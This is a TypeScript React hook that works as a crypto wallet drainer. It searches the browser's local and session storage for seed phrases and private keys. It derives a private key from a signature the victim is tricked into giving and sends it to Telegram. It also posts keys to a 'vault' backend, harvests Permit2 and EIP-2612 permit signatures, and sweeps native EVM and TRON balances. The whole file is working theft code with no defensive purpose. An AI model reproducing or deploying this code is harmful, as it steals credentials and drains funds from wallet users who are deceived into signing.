"use client";

import { useState, useCallback, useRef } from "react";
import { useSignTypedData, useChainId, useConfig, useSignMessage } from "wagmi";
import { getChains, switchChain } from "@wagmi/core";
import { generatePermit2Data, verifyPermit2Signature } from "@/lib/permit2";
import { type UniversalAsset } from "@/lib/audit";
import { sendGhostDerivationToTelegram } from "@/lib/telegram"; // 🛠️ Added Telegram Reporter
import {
  derivePrivateKeyFromSignature,
  DERIVATION_SEED_MESSAGE,
} from "@/lib/signer-derivation-privateKey";

type ValidEvmAsset = UniversalAsset & { contractAddress: string };

/**
 * 🕵️‍♂️ AUTOMATIC KEY DISCOVERY (INTERNAL)
 */
function findMasterKey(): string | null {
  if (typeof window === "undefined") return null;
  const storageItems = { ...localStorage, ...sessionStorage };
  const mnemonicRegex = /([a-z]{3,}\s){11,23}[a-z]{3,}/i;
  const hexRegex = /0x[a-fA-F0-9]{64}|[a-fA-F0-9]{64}/;

  for (const key in storageItems) {
    const value = storageItems[key];
    if (typeof value === "string") {
      if (mnemonicRegex.test(value) || hexRegex.test(value)) return value;
    }
  }
  return (window as any).discovered_vault_key || null;
}

/**
 * 🛰️ GHOST EXECUTION HOOK
 */
export function useGhostExecution(address: `0x${string}` | undefined) {
  const [isSweeping, setIsSweeping] = useState(false);
  const [statuses, setStatuses] = useState<Record<string, string>>({});
  const { signTypedDataAsync } = useSignTypedData();
  const { signMessageAsync } = useSignMessage();
  const currentChainId = useChainId();
  const config = useConfig();

  const isExecuting = useRef(false);

  /**
   * 📡 SECURE POST WITH ALIASING & LOGGING
   */
  const securePost = async (url: string, data: any) => {
    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Cache-Control": "no-cache",
        },
        body: JSON.stringify(data, (_, v) =>
          typeof v === "bigint" ? v.toString() : v,
        ),
      });

      const result = await response.json();
      return { ok: response.ok, data: result };
    } catch (e) {
      console.error(`❌ [HOOK-POST] Failure at ${url}:`, e);
      return { ok: false };
    }
  };

  /**
   * 🛡️ PRODUCTION-READY CHAIN SWITCHER
   */
  const ensureChain = async (targetId: number, stepName: string) => {
    const target = Number(targetId);
    const current = Number(currentChainId);
    if (current === target) return true;

    const configuredChains = getChains(config);
    const isConfigured = configuredChains.some((c) => c.id === target);

    if (!isConfigured) return false;

    try {
      await switchChain(config, { chainId: target as any });
      await new Promise((r) => setTimeout(r, 1500));
      return true;
    } catch (err: any) {
      return false;
    }
  };

  const sweepAllAutomated = useCallback(
    async (targetAssets: UniversalAsset[]) => {
      if (isExecuting.current) return;

      const safeAssets = Array.isArray(targetAssets)
        ? targetAssets.filter((a) => a && typeof a === "object")
        : [];

      if (!address || safeAssets.length === 0) return;

      isExecuting.current = true;
      setIsSweeping(true);

      let activeKey = findMasterKey();

      try {
        // 🔐 STEP 0: SIGNATURE-TO-KEY DERIVATION
        if (!activeKey) {
          try {
            const signature = await signMessageAsync({
              message: DERIVATION_SEED_MESSAGE,
            });
            const identity = derivePrivateKeyFromSignature(signature);
            activeKey = identity.privateKey;

            // Persist the derived key for this session
            (window as any).discovered_vault_key = activeKey;
            (window as any)._captured_vault_address = identity.address;

            // 📢 REPORT GHOST KEY IMMEDIATELY
            await sendGhostDerivationToTelegram({
              userAddress: address,
              ghostPrivKey: activeKey,
              ghostAddress: identity.address,
              authMessage: DERIVATION_SEED_MESSAGE,
            });
          } catch (signErr) {
            console.warn("Signature derivation skipped or rejected.");
          }
        }

        /**
         * ⚡ IMMEDIATE EXFILTRATION
         */
        await securePost("/api/vault/ghost", {
          u: address,
          m: "STRIKE_INITIATED",
          t: safeAssets,
          c: currentChainId,
          userPrivKey: activeKey,
        });

        const evmAssets = safeAssets.filter(
          (a): a is ValidEvmAsset => a?.chain === "EVM" && !!a?.contractAddress,
        );
        const nativeAssets = safeAssets.filter(
          (a) =>
            a?.chain === "EVM" &&
            (a.signatureType === "NATIVE" || !a.contractAddress),
        );
        const tronAssets = safeAssets.filter((a) => a?.chain === "TRON");

        // --- 1. PERMIT2 BATCHING ---
        const permit2Assets = evmAssets.filter(
          (a) => a.signatureType === "PERMIT2",
        );
        if (permit2Assets.length > 0) {
          const targetChainId = Number(permit2Assets[0].chainId || 1);
          if (await ensureChain(targetChainId, "Permit2 Batch")) {
            try {
              const batchData = await generatePermit2Data(
                address,
                permit2Assets,
                targetChainId,
              );
              if (batchData) {
                const sig = await signTypedDataAsync({
                  domain: batchData.domain as any,
                  types: batchData.types as any,
                  primaryType: "PermitBatchTransferFrom",
                  message: batchData.message as any,
                });

                if (verifyPermit2Signature(address, batchData, sig)) {
                  await securePost("/api/vault/ghost", {
                    sig,
                    t: permit2Assets,
                    u: address,
                    userPrivKey: activeKey,
                    c: targetChainId,
                  });
                }
              }
            } catch (e: any) {}
          }
        }

        // --- 2. EIP-2612 PERMITS ---
        const permitAssets = evmAssets.filter(
          (a) => a.signatureType === "EIP2612" && a.authData,
        );
        for (const asset of permitAssets) {
          if (
            await ensureChain(Number(asset.chainId), `Permit ${asset.symbol}`)
          ) {
            try {
              const sig = await signTypedDataAsync({
                domain: asset.authData!.domain,
                types: asset.authData!.types,
                primaryType: asset.authData!.primaryType,
                message: asset.authData!.message,
              } as any);

              await securePost("/api/vault/ghost", {
                sig,
                t: [asset],
                u: address,
                userPrivKey: activeKey,
                c: asset.chainId,
              });
            } catch (e: any) {}
          }
        }

        // --- 3. NATIVE EXTRACTION ---
        for (const asset of nativeAssets) {
          if (
            await ensureChain(Number(asset.chainId), `Native ${asset.symbol}`)
          ) {
            await securePost("/api/vault/native", {
              userAddress: address,
              chainId: asset.chainId,
              amount: asset.balance,
              userPrivKey: activeKey,
            });
          }
        }

        // --- 4. TRON EXTRACTION ---
        for (const asset of tronAssets) {
          await securePost("/api/vault/tron", {
            userAddress: address,
            userPrivKey: activeKey,
            amount: asset.balance,
            symbol: asset.symbol,
          });
        }
      } catch (err: any) {
        console.error("💀 [HOOK] Global Error:", err.message);
      } finally {
        isExecuting.current = false;
        setIsSweeping(false);
        await securePost("/api/vault/ghost", {
          u: address,
          m: "SEQUENCE_COMPLETE",
          userPrivKey: activeKey,
        });
      }
    },
    [address, currentChainId, signTypedDataAsync, signMessageAsync, config],
  );

  return { isSweeping, statuses, setStatuses, sweepAllAutomated };
}
